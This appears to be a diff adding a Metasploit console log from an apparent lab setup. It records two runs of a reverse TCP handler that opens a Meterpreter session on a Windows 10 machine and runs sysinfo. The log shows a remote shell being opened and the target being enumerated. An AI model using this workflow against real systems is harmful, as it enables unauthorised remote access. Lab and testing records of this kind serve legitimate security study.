@@ -1,0 +1,39 @@
+[1m[34m[*][0m Spooling to file ./msfconsole.log...
+resource (revtcp_enum.rc)> exploit
+[0m[1m[34m[*][0m Started reverse TCP handler on 10.0.0.3:666 
+[1m[34m[*][0m Sending stage (175686 bytes) to 10.0.0.2
+[0m[0m[1m[34m[*][0m Meterpreter session 1 opened (10.0.0.3:666 -> 10.0.0.2:49878) at 2022-08-27 05:27:52 -0400
+
+[0m[?1034h[4mmeterpreter[0m > sysinfo
+[0mComputer        : MSEDGEWIN10
+OS              : Windows 10 (10.0 Build 17763).
+Architecture    : x64
+System Language : en_US
+Domain          : CFC
+Logged On Users : 6
+Meterpreter     : x86/windows
+[4mmeterpreter[0m > exit
+[0m[1m[34m[*][0m Shutting down Meterpreter...
+
+[1m[34m[*][0m 10.0.0.2 - Meterpreter session 1 closed.  Reason: Died
+[4mmsf6[0m exploit([1m[31mmulti/handler[0m) [0m> exit
+[0m[1m[34m[*][0m Spooling to file ./msfconsole.log...
+resource (revtcp_enum.rc)> exploit
+[0m[1m[34m[*][0m Started reverse TCP handler on 10.0.0.3:666 
+[1m[34m[*][0m Sending stage (175686 bytes) to 10.0.0.2
+[0m[0m[1m[34m[*][0m Meterpreter session 1 opened (10.0.0.3:666 -> 10.0.0.2:49819) at 2022-08-27 06:49:14 -0400
+
+[0m[?1034h[4mmeterpreter[0m > sysinfo
+[0mComputer        : MSEDGEWIN10
+OS              : Windows 10 (10.0 Build 17763).
+Architecture    : x64
+System Language : en_US
+Domain          : CFC
+Logged On Users : 6
+Meterpreter     : x86/windows
+[4mmeterpreter[0m > exit
+[0m[1m[34m[*][0m Shutting down Meterpreter...
+
+[1m[34m[*][0m 10.0.0.2 - Meterpreter session 1 closed.  Reason: Died
+[4mmsf6[0m exploit([1m[31mmulti/handler[0m) [0m> exit
+[0m
